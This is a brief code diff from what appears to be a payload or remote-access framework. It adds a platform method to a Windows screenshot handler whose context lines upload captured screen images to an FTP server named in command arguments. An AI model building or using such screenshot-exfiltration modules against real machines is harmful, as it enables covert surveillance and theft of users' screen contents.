@@ -9,6 +9,11 @@ from utils.debug_error_handler import ErrorLogHandler
 error_logger= ErrorLogHandler()
 
 class WindowsScreenshotPayloadHandler(AbstractPayloadHandler):
+    
+    @classmethod
+    def get_platform(cls):
+        return "windows"
+
     def ftp_upload(self):
         FTPDownloadPayloadHandler().execute_payload("{} {} {} {} {}".format(
             "upload",self.cmd[2],self.cmd[3],self.cmd[4],self.image_file
